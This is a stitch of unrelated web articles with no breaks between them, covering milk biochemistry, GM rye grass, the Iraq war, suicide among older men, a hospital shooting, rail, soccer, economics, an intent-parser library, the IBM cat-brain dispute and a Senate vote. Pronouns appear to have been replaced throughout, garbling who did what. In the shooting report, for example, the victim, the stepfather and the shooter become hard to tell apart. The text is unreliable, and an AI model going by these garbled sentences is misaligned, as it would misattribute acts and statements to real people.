Abstract
Based on own translational research of the biochemical and hormonal effects of cow's milk consumption in humans, this review presents milk as a signaling system of mammalian evolution that activates the nutrient-sensitive kinase mechanistic target of rapamycin complex 1 (mTORC1), the pivotal regulator of translation. Milk, a mammary gland-derived secretory product, is required for species-specific gene-nutrient interactions that promote appropriate growth and development of the newborn mammal. This signaling system is highly conserved and tightly controlled by the lactation genome. Milk is sufficient to activate mTORC1, the crucial regulator of protein, lipid, and nucleotide synthesis orchestrating anabolism, cell growth and proliferation. To fulfill its mTORC1-activating function, milk delivers four key metabolic messengers: (1) essential branched-chain amino acids (BCAAs); (2) glutamine; (3) palmitic acid; and (4) bioactive exosomal microRNAs, which in a synergistical fashion promote mTORC1-dependent translation. In all mammals except Neolithic humans, postnatal activation of mTORC1 by milk intake is restricted to the postnatal lactation period. It is of critical concern that persistent hyperactivation of mTORC1 is associated with aging and the development of age-related disorders such as obesity, type 2 diabetes mellitus, cancer, and neurodegenerative diseases. Persistent mTORC1 activation promotes endoplasmic reticulum (ER) stress and drives an aimless quasi-program, which promotes aging and age-related diseases. View Full-Text
Ben Copeman, general manager of the National Association for Sustainable Agriculture Australia, said while organic producers had to follow strict labelling requirements, the same rules did not apply to products with GM crops in their food chain, potentially leaving consumers unaware. Mr Copeman also said many of Australia's important grain customers, such as Japan, China and Korea, did not want GM in their food chains and had zero tolerance to GM contamination. While GM rye is unlikely to be available until 2020, a long-term research project into the potential benefits of the grass has moved to its next stage, including looking at regulatory requirements, after more than six years spent developing new varieties of pasture. News of the work at the Dairy Futures Co-operative Research Centre follows controversy over a landmark WA Supreme Court ruling in May, that dismissed an organic farmer's claim that their land had been contaminated by GM canola grown by their neighbour, a conventional farmer. Kojonup organic farmer Steve Marsh this week announced they would appeal against the court's ruling. The original case centred on Mr Marsh's bid to sue neighbour Michael Baxter, alleging they had lost organic certification for more than half their farm after GM canola drifted onto their land from Mr Baxter's property. NASAA, which withdrew Mr Marsh's organic certification, welcomed the appeal, saying both conventional and organic farmers had the right to grow crops without contamination from GM materials.
“The original decision has the potential to affect the vast majority of Australia's conventional growers who choose not to grow GM as well as certified organic farmers," Mr Copeman said. "On behalf of all organic producers and consumers, NASAA has drawn a line in the sand on the issue of GM in the organic food chain because our markets demand a zero tolerance of GM. In addition, both farmers and consumers have the right to choose what they grow and what they eat." The subject of GM modified food and crops in Australia continues to spark debate. There are 0.7 million hectares of GM cotton and canola grown in Australia, with canola the biggest GM crop in Victoria. But there are moratoriums on all GM crops in the ACT and Tasmania and limited bans in the other states. Paula Fitzgerald, manager of biotechnology and strategic initiatives at Dairy Australia, and the Dairy Futures CRC spokesperson, said GM rye grass would not be commercially available before 2020, with a huge amount of scientific work and industry considerations to be worked through. Earlier this year, a report on the work of the CRC, which is jointly funded by the Victorian government and industry body Dairy Australia, was published in a prestigious peer-reviewed journal. "Up to date we have been developing these new rye grass varieties and assessing whether they are high energy. From there the work would have to go through a number of other stages in terms of regulatory approval and more trials," they said.
Ms Fitzgerald said GM rye grass could mean an extra $250-300 dollars per hectare of value to farmers, by delivering higher milk yields. They said there had been a lot of interest in the pasture and its potential to help dairy farmers meet growing demand from Asia. Concern over GM crops often centres on the likelihood of GM materials spreading to nearby farms and this is of particular concern with rye grass, which can be carried on pollen and therefore spreads across a far larger area. But Ms Fitzgerald said this issue had been carefully considered with GM canola, particularly the potential for it to be carried with pollen, and it had been resolved to the regulator's satisfaction. They said as work on GM rye grass progressed there would be "a dialogue" with the dairy industry over its effect on the whole supply chain. Organic honey producer David Seymour, who sources honey from 16 farms in Victoria, said any contact with GM rye grass would put them out of business. Mr Seymour said that to maintain their organic certification there had to be no "adverse farming activities" within a five-kilometre radius.
Dairy Australia is already working hard to win the public relations battle over GM crops, with recent reports in regional media about DA's bid to develop "farming heroes" - individuals who would help spread a positive message about GM crops among local farming communities.

It's been five years since we headed down the rabbit hole to Iraq. Reflecting on this milestone while visiting Baghdad a couple of days ago, Dick Cheney declared that “we've come a long way” since the days of “Mission Accomplished,” describing the war as “a difficult, challenging, but nonetheless successful endeavor.” Which in the topsy-turvy, up-is-down world of Iraqspeak means that we are still horribly, gut-wrenchingly screwed.
To commemorate the war's fifth birthday, here's a brief collection of some of Mother Jones' coverage of the challenges and difficulties of the past few years. Or, as the vice president might put it, the Iraq War's greatest hits:
• Before 2003, Iraq had no ties to Al Qaeda. Now it's a terrorist breeding ground and distraction from the war on terror—the one that was against the Al Qaeda that existed before we created the new one in Iraq.
• Remember how Ahmad Chalabi conned the White House into invading Iraq? Suckers. Hard-nosed journalists would have never fallen for their crap. Oh wait—they did.
• So maybe it was a bad idea to take the soldiers involved in prisoner abuse in Afghanistan and send them to run prisons in Iraq.
• But then, the highest-ranking officer to be tried for the abuses at Abu Ghraib was let off with a slap on the wrist. Clearly, there's nothing more to see here.
• Hey, Senator McCain—we know that it's hard to keep track of that Sunni-Shia thing. Our “Iraq for Dummies” handbook can help.
• The good news: More GIs are surviving their combat wounds than ever before. The bad news: More than 3,900 have died. And more than 4,600 have suffered serious head or brain injuries; more than 1,300 are amputees.
• Saddam's WMDs were nonexistent, but they did have real, live weapons researchers whom the U.S. let slip slip through the cracks. Just promise you'll keep that nefarious know-how to yourselves, guys!
• Public service announcement: Getting out of Iraq is gonna be ugly any way you slice it.
• So many lies, so little time—lies about WMDs, lies about progress on the ground, lies about torture. We've been collecting them in our “Lie By Lie” timeline—years of official mendacity at your fingertips!
No doubt the hits will keep coming in the year ahead. By next March, Cheney will have moved on, but no matter who occupies the White House, the U.S. will will have spent another year in Iraq.
The most recent Australian suicide statistics from 2013 show that, out of the whole population, men aged 85 years and over have the highest suicide rates. While the attention these figures have garnered is a positive sign, this is hardly a new phenomenon.
Over 38 men in every 100,000 of that age group die by suicide, which is more than double the rate among men under 35. The rate is around seven times higher than in women of all ages.
With very few exceptions in Australia's history, annual suicide rates have always peaked in older males. And while these rates fluctuate from year to year, there's no evidence of any sustained increase in the past decade.
This is the common theme worldwide. Most countries record their peak suicide rates in this group. So why has the problem of suicide in older males not been an issue of concern for the general public?
A grim picture
It's certainly not due to a lack of knowledge about suicide in older men, or its drivers. Numerous Australian and overseas studies have identified issues such as severe depression, loneliness, social isolation and lack of social support; physical health issues, such as pain and cancer; and loss of independence as being important in various ways.
Of course, how these issues affect someone varies considerably and often depends on the person's life journey from childhood through to late life. Childhood adversity, personality attributes, experience of traumatic life events, relationships, employment and use of alcohol and other drugs can all affect someone's suicide risk late in life.
Unfortunately, too many people appear to confuse older people's “right to die” with suicide. This tends to cloud the issue as well as hamper efforts for suicide prevention.
Many of the reasons euthanasia advocates regard as being circumstances in which an older person might choose to die are indeed similar to the factors associated with suicide in late life. And that's why there's an assumption that these really are older people taking matters into their own hands in a society where euthanasia is illegal.
But evidence to support this view this is minimal. Our research suggests that less than 10% of late-life suicides could potentially be in people who would have chosen and met generally accepted criteria for euthanasia, such as being a member of a euthanasia group.
Further, in countries where euthanasia is legal, such as the Netherlands, Belgium and Switzerland, suicide rates still peak in males over the age of 75. In Belgium and Switzerland, the rates are much higher than in Australia. Access to euthanasia then doesn't appear to affect the high rates of suicide in older men, which is unsurprising because, in the main, they are different phenomena.
Hidden ageism
Ageist attitudes also hinder efforts to prevent suicide in older people. Too many mistakenly believe it's normal for an older person to get depressed when the evidence is to the contrary.
If anything, clinical depression becomes less common with age. This has also been debated, though, and true rates are, in fact, likely to be higher than surveys show.
Younger people often imagine themselves trying to cope with the effects of age and conclude that perhaps they might be better off dead. Almost 50 years ago, Pete Townshend from English rock band, The Who, captured this view in My Generation, with the line:
I hope I die before I get old.
This became something of an anthem for the baby boomer generation, which started to turn 65 in 2011. But as people age, their attitudes evolve and circumstances that might have challenged them in their youth no longer seem as insurmountable.
Indeed, as they age, most people have to cope with mounting chronic health problems, the loss of family and friends, and the challenges of social isolation. And they do so remarkably well. Despite any difficulties they face, older people are often the patriarchs and matriarchs of families, and society as a whole.
If we're to get serious about suicide prevention in older men, we first need to accept that trying to prevent suicide is not akin to opposing euthanasia. And groups campaigning to legalise euthanasia need to understand that efforts to prevent suicide in older people are not intended to interfere with any person's right to die.
Rather, they're intended to help identify older people who are suffering in various ways and to allow relief from such suffering – whether it be through friendship, pain relief, spiritual guidance, or treatment of severe clinical depression.
Our rapidly increasing ageing population provides an imperative to change, otherwise the suffering will only accumulate. There are well-researched programs for preventing late-life suicide that can make a difference. It's time we implemented them.

Frink was arraigned Wednesday. (Lebanon Police Department via AP)
NORTH HAVERHILL, N.H. (AP) — A man charged with killing their 70-year-old mother in their room at a hospital intensive care unit had asked their stepfather to leave so they could be alone and then aimed a gun at them and fired several times, according to a police complaint released Wednesday.
Travis Frink, of Warwick, Rhode Island, pleaded not guilty to a first-degree murder charge in the death of their mother, Pamela Ferriere. They were being held without bail.
Ferriere, of Groton, was fatally shot Tuesday at Dartmouth-Hitchcock Medical Center in Lebanon, where they were being treated for an aneurysm. Autopsy results completed Wednesday showed that Ferriere had been shot four times, including in the chest and abdomen and died from the gunshot wounds.
Frink, 48, was handcuffed and said nothing during the brief arraignment Wednesday in Grafton Superior Court in North Haverhill.
Prosecutor Jane Young asked that Frink have no contact with their stepfather, Bob Ferriere, who told police they saw Frink shoot them Defense lawyer Rebecca McKinnon agreed to the request. They declined to comment afterward.
A police affidavit says Frink told officers they went to the hospital to kill their mother. No reason or motive was given.
“Who shoots their mother? Who does that? That is a sick person,” said Patti Oakley, a neighbor of the Ferrieres'.
Oakley said “my heart was broken” when they heard the news and talked of a religious woman who loved the outdoors but never discussed their son. Bob and Pamela Ferriere moved to this remote forested neighborhood along a gravel road several years ago and Oakley said they couldn't recall Frink every visiting.
Oakley recalled how Ferriere made cookies for children on Halloween and talked of Ferriere telling them how they relished the laughter of the youngsters after Oakley asked whether they were being too noisy.
“She always had a smile,” they said. “She was a very kind person.”
The town of Groton put out a statement saying Pamela Ferriere was active in town government and in their local church, and they enjoyed gardening and biking with their husband.
“Pam will be missed, but we know they are with their Lord and Savior,” the town said. “She was looking to be home from the hospital soon and back to their home that they and Bob shared and to their normal activities.”
When Frink went to visit their Tuesday, Bob Ferriere was in the room and Frink asked to spend some time alone with their mother, authorities said.
Ferriere asked their wife if that was OK and they indicated yes, the affidavit said. As they were leaving the room, they heard their shout or scream, then turned and saw Frink pointing a gun at her, the affidavit said. After several shots were fired, Frink walked out of the room without saying anything, Ferriere told police.
Pamela Ferriere's nurse called 911, saying a visitor had pulled out a black handgun. When they saw the gun, the nurse ran and took shelter in a different room. They then heard two gunshots, followed by screams.
The hospital, New Hampshire's largest, was then placed on lockdown.
When asked about the shooting Wednesday morning by The Associated Press, Bob Ferriere said they had no idea why it happened. “I'm not a mind reader,” they said, before hanging up. Outside their house, Bob Ferriere said they didn't want to discuss the shooting any further.
Frink was detained as they tried to leave the grounds of Dartmouth-Hitchcock, authorities said.
The affidavit said Frink also visited their mother earlier in their hospital stay. The nurse who called 911 told police they had been their mother's nurse for the past two weeks.
In 2013, Frink's ex-wife and their 3-year-old son were found dead inside a running car at an apartment complex in Rhode Island.
Police said that when officers opened the door of the running car with fogged windows, they found the inside of the vehicle very hot and smelling of alcohol and vomit. Officials said the body of Kathleen Frink was found in the driver's seat and the body of their son was found on the floor in the back of the car.
Police said at the time they ruled out foul play and suspected alcohol played in a role.
Frink's Facebook page shows they got engaged last December. Their LinkedIn page includes a long list of experience in computer systems administration and technical support jobs in Rhode Island, Connecticut, New York and Massachusetts. Messages left with the company listed as their current employer weren't immediately returned.
Several of Frink's neighbors in Warwick said they mostly kept to himself.
Tuesday's shooting sparked panic at the hospital as employees and patients were evacuated into the parking lot. People were told to avoid the area around the hospital, and traffic was stopped on a route leading to it.
Officials at Dartmouth-Hitchcock said employees were well-trained to respond to the shooting. They said they are reviewing their security procedures but feel comfortable that they can continue to provide a safe environment for patients.

All over by Christmas: deadline set for end of Newcastle heavy rail line
Updated
The New South Wales Government has set Boxing Day as the date trains will stop running into the Newcastle CBD via the existing heavy rail line.
Truncating the line on December 26 will see the existing railway level crossings permanently opened between Wickham and the city's east end.
The project will deliver up to 11 new pedestrian and road crossings in the rail corridor.
Transport Minister Gladys Berejiklian says closing the line at Wickham and eventually building light rail will unlock Newcastle's potential, by removing the barrier that has divided the city and the waterfront.
They say all Newcastle trains will initially terminate at Broadmeadow to allow improvements to be made at Hamilton station and frequent shuttle buses will connect passengers with the city.
The new transport interchange at Wickham which will be the new terminus for trains is due to be completed at the end of 2016.
The Minister says Boxing Day was chosen as the date for closing the rail line as it is normally a quiet time for public transport.
Ms Berejiklian says the government is meeting its commitment to progress the project, while ensuring public transport services are maintained.
"So my mission is to make sure that during the transition process I make it as easy as possible for customers to move around on public transport," they said.
"Of course we'll make sure that in the interim arrangements we have bus services that are frequent and reliable to make sure people do still have that continuous journey no matter which part of the Hunter they are coming from."
They say more details will be released in coming months about the interim bus arrangements, but there is no date yet for the introduction of light rail services.
Ms Berejiklian says they are convinced the number of people using public transport will increase as a result of cutting the line.
"I want to increase the proportion of people who catch public transport.
"I'm absolutely convinced that will occur when the light rail is up and running as well, but it's my job to make the transition as smooth as possible.
"To open up the city and work with other government agencies to really allow Newcastle and the Hunter to reach its full potential."
The Minister has also released a tender to carry out a detailed environmental assessment of the light rail project.
Opposition Leader John Robertson says the government is rushing to stop rail services ahead of the March state election, despite not having final planning approvals in place.
But, they say should Labor win the March poll, they will be aiming to bring the trains back.
"I think we have to wait and see how much work is done between Boxing Day and the next election," they said."
"The next election is certainly going to be a struggle for Labor to win, but we've made it clear that if the rail line is at a point where it can't be easily re-commenced operations, we won't be doing that.
"But if we can commence operations because no work has been done, and chances are that will be the case, then we would continue to operate the rail line."
The Hunter Business Chamber says setting a date for the rail line removal is an important milestone for the city's urban renewal.
CEO Kristen Keegan says the next step will be ensuring the new Wickham interchange will meet the city's growing transport needs.
"We're very interested in looking at the design and scope of the Wickham interchange and what that will mean for the city and what that will mean as a pivotal place for other transport services to interchange, that's going to be a very exciting project too."
A Review of Environmental Factors is due to start later this month for the Wickham Interchange, with the community getting the chance to give feedback on the design and construction.

The Colorado Rapids opened up their season with a 1-0 victory at home over the New England Revolution. Here are three takeaways from the game.
Last Saturday, the Colorado Rapids began their season with a matchup against the New England Revolution. First a look back are the match highlights.
New England earned the first real chance of the game in the 16th minute when Kei Kamara chested a ball down and shot from a tough angle at 12 yards out. Zac MacMath was able to stick a hand out and parry the shot away.
A few minutes later, Kevin Doyle broke through the Revolution back line, but they were stopped by New England keeper Cody Cropper. The Rapids continued to push until they finally got a goal in the 52nd minute whenDominique Badji drew a foul in the corner. Doyle hit a header off the post from the ensuing free quick, and after a scramble Badji was able to tap the ball in with their head.

After the goal, New England never really look dangerous. The closest they got to a “chance” was a long 30-yard shot that went safely into the arms of MacMath. In the end, the Rapids closed out a 1-0 win. The full highlights can be seen below
Good start to the season. Time to take that momentum into New York.#Rapids96#MLSisBack pic.twitter.com/6kOnYXSbaP — Colorado Rapids (@ColoradoRapids) March 5, 2017
Here are three big takeaways from the game:
1) The Rapids' defense is just as good as last year/New England's offense struggled
Many people came into this season wondering if the Rapids could possibly match the defensive form they had last year, when they only let up 32 goals. During their first game, they looked to have picked up exactly where they left off in 2016. Even if it isn't a record breaking year again, look for the Rapids to be just as good on defense.
New England, on the other hand struggled offensively. Sure, the Rapids have a great defense, but New England didn't produce any real offense. Even with four great attacking talents (Agudelo, Kamara, Fegundez, and Nguyen) the Revs struggled to really produce anything of value. After some off-season hype, they will all need to step their game up if they want to have a successful season.
2) Kevin Doyle shows up
Kevin Doyle has been with the Rapids for a few seasons now. In 49 appearances, Doyle has only scored 12 goals. With the money they are paid, there is much more expected of him. On Saturday, they looked ready to finally meet those expectations.
Doyle looked threatening for most the game, and they should have gotten a goal when their header hit off the post. If they can keep this play up, look for Doyle to live up to their expectations and make the Rapids that much more difficult to defeat.
3) Dillon Serna is back
Just eight months after tearing their ACL, Dillon Serna made a substitute appearance during Saturday's game. If they are able to get back into the groove, the fan favorite could definitely prove to be a difference maker for the Rapids, especially with the struggles they have had on offense since their injury.
Hamilton's new stadium, Tim Hortons Field, is experiencing yet another delay.
The builder, Ontario Sports Solutions, estimated that it would be finished by Nov. 28. Now, a day before that deadline, the project is delayed again with no deadline given.
"I'm frustrated," said Gerry Davis, the city's head of public works. "It should have been done. It's very, very frustrating."
Infrastructure Ontario is responsible for the $145-million, 22,500-seat stadium. The city takes possession when construction crews finish.
The first deadline was June 30. Builders then hoped to finish in time for the first Hamilton Ticats home game on July 16. After missing three home games in the summer, builders finished it enough to host the Labour Day Classic. By the time last weekend's Eastern Final arrived, the team was able to play before a sold out crowd, so the remaining work didn't affect attendance. In the seven games the team has played there, it has yet to lose.
The CFL season over, but for Sunday's grey Cup, and builders are still working. Crews will meet the deadline for the Pan Am Games next July, so TO2015 soccer games will be played in Hamilton, Davis said. But significant mechanical, heating and ventilation work is still outstanding.
"We're telling them, 'Finish the job, get out and let us in," Davis said.
Here's the tale of the Pan Am stadium delay, in quotes:

In Denmark you could acquire Bloodborne simply by donating your blood.
It's all part of a charity blood drive hosted by PlayStation Denmark and GivBlod. This promotion is in response to Denmark having a dearth of male blood donors, so you'd not only be getting a rad-looking game, but you'd be giving to a good cause.
[Editor's Note: It appears donors must role a die to determine which game they get. Thanks for the correction, Herringson.]
Despite the note about Denmark's lack of male donors, there doesn't appear to be any restrictions regarding gender, so women should be able to partake in this promotion too.
There are other PlayStation games available that donors can receive, though these aren't listed. Participants also get a chance at winning a Bloodborne-themed PS4.
This Bloodborne promotion will occur on 23rd March from noon to 5pm at IT University in Copenhagen.
There's a problem with that answer. Taxes are a flow; they have the units $/time. Taxes create a flow demand for intrinsically worthless bits of paper. But there is a stock of intrinsically worthless bits of paper; and that stock has the units $. And if that stock of paper is strictly positive and increasing over time, as it usually does, that means the flow supply of new paper created must exceed the flow demand for paper to pay taxes. So if flow supply exceeds flow demand, why doesn't the market price of those intrinsically worthless bits of paper fall to zero?
If intrinsically worthless bits of paper paid interest, or appreciated over time, and so gave the same rate of return as other assets, there would be a stock demand for those intrinsically worthless bits of paper. Matching that stock demand to the stock supply could give us a positive equilibrium price, just like any asset, even if the stock was increasing over time. But paper currency usually does not pay interest, and usually depreciates over time. Indeed the Bank of Canada, which issues the intrinsically worthless bit of paper (OK, plastic) in my pocket, promises it will do its best to ensure they depreciate over time at 2% per year. And sometimes currency is expected to depreciate much more quickly than that, and yet people still want to hold it at some positive price. So why do I have a stock demand for that paper? Why don't I hold my wealth in some other asset instead, then pick up some of those worthless bits of paper off the growing pile littering the streets just before the government stupidly insists I must give it some?
Suppose we did have a theory of the stock demand for money. For example we could say that monetary exchange is more convenient than barter exchange, and that it is very inconvenient to spend money immediately after it enters our pockets, so we want to hold a stock of money temporarily despite it paying no interest and depreciating in value. The convenience yield of a stock of medium of exchange offsets the loss of interest and depreciation. Putting that stock demand for money against a limited stock supply of money there will be an equilibrium in which money has a positive value. (And yes, there may be a second equilibrium in which it has zero value and so cannot be used as a medium of exchange and so has no stock demand; and we are still waiting to see if Bitcoin for example stays in the first or collapses to the second equilibrium.)
If the government forces us to pay taxes in labour (like a military draft) we won't use labour as a medium of exchange. Labour doesn't work very well for that purpose. But if we have a stock demand for bits of paper to use as a medium of exchange, and if the stock supply were limited, those bits of paper could have positive market value even if we paid all our taxes in labour.
The flow demand for money to pay taxes is neither necessary nor sufficient to explain why a stock of intrinsically worthless bits of paper have positive value. Nor why they are used as medium of exchange.
Now it is true that the government is very influential in deciding what good will be used as money. Because each of us wants to use the same medium of exchange as the people we trade with. If everyone I trade with wants to be paid in those intrinsically worthless bits of paper, I will use that paper to buy food and clothes as well as to pay taxes. There's a strategic complementarity in what we choose to use as money. And governments are big players in the money game. So if the government uses something as money, there's a good chance the rest of us will all follow its lead. Just like when the government switches to Daylight Saving Time most of us just follow along. But it doesn't always work. The Cuban government tried to ban the use of US dollars, but failed.
2. What is the relation between the flow of monetary expenditures and the stock of money?
Purely as a matter of accounting identity, we can define Velocity of circulation as the ratio between the flow of monetary expenditures and the stock of money. Velocity has the units (1/time). Velocity reconciles flows of monetary expenditures ($/time) and stocks of money ($).
But velocity is not just an accounting relationship between flows and stocks. I can choose the velocity of circulation of the money I hold. I can choose to spend it very quickly after I receive it, or I can choose to spend it very slowly. So can every other individual. So any theory which has a stock of money and a flow of monetary expenditures must implicitly also be a theory of individual choice of velocity. Does that implicit theory of individual choice make sense?
Suppose for example you have a theory which says that government expenditure creates money and taxes destroy money. So that a government deficit means that the stock of money is growing over time and a surplus means the stock of money is shrinking over time. Also suppose that same theory says that there is a relationship between the level of government deficit and the level of monetary expenditures. But that means that a government deficit that is constant over time means the stock of money is growing over time relative to the level of the flow of monetary expenditures. And purely as a matter of accounting identity that means velocity must be falling over time, towards zero. And a budget surplus must mean velocity is rising over time, without limit.
Why would individuals choose to have velocity falling over time towards zero or rising over time without limit? Do those choices make sense?
The simple textbook's ISLM model has a clear and simple answer to those questions. It says that velocity is a positive function of the opportunity cost of holding money, so if money always pays 0% interest, a rise in the rate of interest on other assets will cause velocity to increase. You might not agree with that answer, but it is an answer.

Adapt
What is the Adapt Intent Parser?
Adapt is an intent parser – meaning that it is a library for converting natural language into machine-readable data structures, such as JSON. The Adapt Intent Parser is open source software. It is lightweight and is designed to run on devices with limited computing resources, such as embedded devices.
You may prefer to watch this video which provides an overview of the Adapt Intent Parser.
Adapt takes in natural language as an input, and outputs a data structure that includes
the Intent : what the User is trying to do
: what the User is trying to do a match probability : how confident Adapt is that the Intent has been correctly identified
: how confident Adapt is that the has been correctly identified a tagged list of entities: that can be used by Skills to perform functions
Adapt is useful for interpreting natural language input. For example, you might want to create a voice user interface that allows a User to play a Pandora station. The Utterances a User might Speak include:
Turn on Pandora
Play Pandora
Play my Joan Jett Pandora station
The Adapt Intent Parser takes this input and generates a JSON data structure like this:
{ "confidence": 0.61, "target": null, "Artist": "joan jett", "intent_type": "MusicIntent", "MusicVerb": "put on", "MusicKeyword": "pandora" }
Applications – or Mycroft Skills – can then parse the JSON data take appropriate action – such as playing Joan Jett using the open source Pandora application Pianobar.
Is Adapt right for me or my use cases?
Adapt is useful for determining user intent quickly and accurately from natural language. It is particularly beneficial for applications with limited vocabularies – that is, where the User will only issue a small number of Utterances.
Adapt has a number of features.
Lightweight
Adapt is written to run on embedded system with limited resources. Adapt can be used as the engine to parse natural language on IoT devices like remote controls and hubs.
Portable
Adapt is written in Python. Python is very widely adopted and supported in the technical community. Because it is written in Python, Adapt will run on many different devices – from servers to a Raspberry Pi. Adapt is designed to be run cross-platform and can be deployed in software environments that include Android, iOS, Windows and Linux.
Reliable
Because Adapt is small enough to run locally on an embedded device, it removes the dependency of having to parse intent in the cloud. This allows applications to function when they don't have an internet connection. Adapt is therefore suited to environments where the internet connection is slow, unreliable or intermittent.
Open source
At Mycroft.AI, we believe that artficial intelligence is too important to be controlled by a few large companies. Adapt is open source, licensed under the GNU Lesser General Public License 3.0. Anyone can access the source code, change the software and use Adapt Intent Parser in new free and open source applications.
Open Source software powers the Internet. Artificial intelligence software, like Adapt Intent Parser, is gaining in importance. However, very few artificial intelligence software is open source. Here at Mycroft.AI, we believe that natural language processing is going to be a key component of many future technologies. By sharing our software we believe that we can help bring artificial intelligence to the open source community where it can be used to benefit millions of users world wide. We hope to work with other open source initiatives like TensorFlow and OpenAI to ensure that the future of artificial intelligence is open for all.
Who developed Adapt?
Adapt Intent Parser was developed at Mycroft.AI by a team led by Sean Fitzgerald. Sean was previously a developer at both Siri and Amazon Echo.

Stat-tracking website Raptr has announced plans to phase out console support.
While the website will continue to operate, it will instead focus its resources towards PC gaming, explaining that recent changes to Xbox Live and PSN have "repeatedly" broken the site's system.
"When Raptr started out, we offered Steam and XBL achievements and PSN trophy tracking, PC/Xbox 360 gameplay tracking, plus unified buddy lists and chat," a message posted on the website explains. "As Raptr grew, we realized there was a big demand for features that improved the PC gaming experience, such as game optimizations, easy Twitch streaming, and lightweight video capture.
"But on the console side, you may have noticed some features stopped updating, as changes to Xbox Live and PSN would repeatedly break our system."
The website had allowed Xbox and PlayStation users to automatically track their playtime and achievements/trophies, but has struggled to keep up with changes introduced to both platform holders' networks following the launch of PS4 and Xbox One.
"We believe our mission is to make PC gaming fun and effortless, and therefore we've decided to focus our resources on PC gaming exclusively," it continued. "We will retire all remaining console support in the near future."
"Your console-related information is still available on Xbox Live and PSN, and for those looking for a unified tracking solution, we recommend Playfire."

IBM's claim of simulating a cat cortex generated quite a buzz last week, but now the head researcher from the Blue Brain project, a team that is working to simulate its own animal brain (a rat's), has gone incandescent with fury over the what they call the "mass deception of the public."
Henry Markram leads the Blue Brain project that successfully simulated a self-organizing slice of rat brain at the École Polytechnique Fédérale de Lausanne in Switzerland. They have issued a point-by-point denouncement of the cat claim that bubbles with outrage at IBM Almaden's Dharmendra Modha.
"There is no qualified neuroscientist on the planet that would agree that this is even close to a cat's brain," Markram writes in their e-mail to IBM. "I see they [Modha] did not stop making such stupid statements after they claimed they simulated a mouse's brain."
Markram calls the IBM simulation a "hoax and a PR stunt" that any parallel machine cluster could replicate. They add that creating a billion interactive virtual neuron points represents no meaningful achievement as far as simulating intelligence, but merely reflects the brute supercomputing power at IBM's disposal.
"We could do the same simulation immediately, this very second by just loading up some network of points on such a machine, but it would just be a complete waste of time -- and again, I would consider it shameful and unethical to call it a cat simulation," Markram says. They suggested that IBM's simulation feat does not even reach the levels of ant intelligence.
The Blue Brain researcher concludes by expressing their shock at IBM and DARPA's support of the virtual feline brain, and says that they would have expected an ethics committee to "string Modha up by their toes." Yikes.
Still, Markram has a point. Creating any sort of artificial intelligence has long represented a difficult and arduous process, and so expecting a miracle breakthrough seems unlikely. Perhaps we should have paid more attention to the novel Good Omens, where Hell's agent Crowley owns "an unconnected fax machine with the intelligence of a computer and a computer with the intelligence of a retarded ant." To add some more perspective, that book was published back in 1990.

The State Department on Saturday criticized Turkey over attempts to intimidate and threaten a New York Times correspondent whose reporting about Turks recruited by the Islamic State, the militant group, has deeply offended Turkey's president.
Personal attacks conveyed through email and Twitter aimed at the correspondent, Ceylan Yeginsu, have intensified in Turkey since the publication of their article on Tuesday about the Islamic State's recruitment efforts.
On Friday, Turkish newspapers controlled by allies of the president, Recep Tayyip Erdoğan, published front-page photographs of Ms. Yeginsu and asserted that they were a traitor and foreign agent who was seeking to falsely imply that Mr. Erdoğan is a closet supporter of the Islamic State.
Turkey, along with the United States and most other countries, regard the group as a terrorist organization.
Since 2000 more than 164 people have died in fires at colleges and universities. Four out of five of those occur in off-campus housing.
The Alarming Truth is a short film produced as part of a national campaign to raise awareness about fire safety among college students.
Funded under a Department of Homeland Security Fire Prevention and Safety grant, the film depicts a fire at an off-campus residence, and the unfortunate outcome that affects all those involved.
The video and campaign have been developed through the collaborative efforts of the Clery Center for Security On Campus, Campus Firewatch, Michael H. Minger Foundation, Rowan University, University of Pennsylvania, and the Philadelphia Fire Department.
All colleges and universities are encouraged to make use of the free video and accompanying materials produced through this campaign.
Washington (CNN) -- The Senate on Thursday rejected a Democratic bid to open debate on repealing the "don't ask, don't tell" policy banning openly gay and lesbian soldiers from military service, possibly killing any chance for it to get passed in the current congressional session.
However, a bipartisan group of senators immediately said they would raise the issue again in a separate piece of legislation. It was unclear if the bid to separate the repeal provision from a larger defense authorization bill would increase its chances for approval.
Senate Majority Leader Harry Reid, D-Nevada, called Thursday's vote without an agreement with any Republican senators to support the motion, ensuring it would fail. The vote was 57-40 in favor of the cloture motion that required 60 votes to pass.
A Republican filibuster forced Democrats to seek a deal that would get them the necessary GOP support to get the 60 votes to proceed. The Democratic caucus has 58 members, meaning they needed at least two Republicans to join them to overcome the filibuster.
Reid had been negotiating with moderate Republican Sen. Susan Collins of Maine for their support, and they postponed a planned vote Wednesday to allow more time for the talks to reach agreement.
However, Reid announced Thursday they were calling the vote to open debate on the defense authorization bill, saying it was time to act on it after months of Republican obstruction and intransigence.
Collins, apparently caught by surprise, missed the start of Reid's speech and requested a chance to question them on the Senate floor. They reiterated their support for repealing "don't ask, don't tell" and asked if the deal they had been discussing with Reid on Wednesday still stood.
Reid indicated they would honor parameters of the deal, which would allow Republicans to offer up to 10 amendments along with ample time for debate, but they refused to make an outright commitment. They blamed Republican leaders for the situation and praised Collins for being the only GOP senator they could even speak to about a possible deal for their support.
In response, Collins said, "I am perplexed and frustrated that this important bill is going to become a victim of politics. We should be able to do better."
The vote then proceeded, with Collins joining Democrats in voting to open debate while one Democrat, newly elected Sen. Joe Manchin of West Virginia, voted with the filibustering Republicans. Manchin's opposing vote killed any chance for the Democrats to succeed.
President Barack Obama said in a statement that they were "extremely disappointed that yet another filibuster has prevented the Senate from moving forward" with the defense authorization measure that includes the repeal provision.
Noting support for repeal from the defense secretary, the Joint Chiefs of Staff chairperson and a majority of Americans, Obama said the "don't ask, don't tell" policy "weakens our national security, diminishes our military readiness, and violates fundamental American principles of fairness, integrity and equality," Obama's statement said.
"While today's vote was disappointing, it must not be the end of our efforts," Obama said. "I urge the Senate to revisit these important issues during the lame-duck session."
Gay rights advocacy groups, including those comprising military personnel, immediately condemned the Senate vote.
"Today leaders of both parties let down the U.S. military and the American people," said Joe Solmonese, president of the Human Rights Campaign. "Instead of doing what is right, 'the world's greatest deliberative body' devolved into shameful schoolyard spats that put petty partisan politics above the needs of our women and men in uniform."
Solmonese added. "This fight is too important to give up despite this setback and we will continue fighting in this lame-duck session. It's not over."
Sen. Joe Lieberman, an independent from Connecticut who caucuses with the Democrats, later said they believed that up to four Republican senators -- Collins, Scott Brown of Massachusetts, Lisa Murkowski of Alaska, and Richard Lugar of Indiana -- might support a separate repeal proposal that they will introduce with Collins and Sen. Mark Udall, D-Colorado.
